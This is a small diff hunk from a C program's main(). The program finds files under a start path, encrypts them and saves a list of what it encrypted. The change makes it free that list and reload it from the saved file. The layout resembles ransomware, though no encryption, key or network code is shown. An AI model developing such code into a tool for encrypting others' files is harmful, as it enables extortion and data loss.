@@ -18,7 +18,8 @@ int main(){
     find_files(&files, start_path);
     encrypt_files(files, &encrypted, &not_encrypted);
     save_into_file_encrypted_list(encrypted, start_path);
-    //read_from_file_encrypted_files(&encrypted, start_path);
+    destroy(&encrypted);
+    read_from_file_encrypted_files(&encrypted, start_path);
     //destroy(&files);
     //destroy_encrypted_list(&encrypted);
 
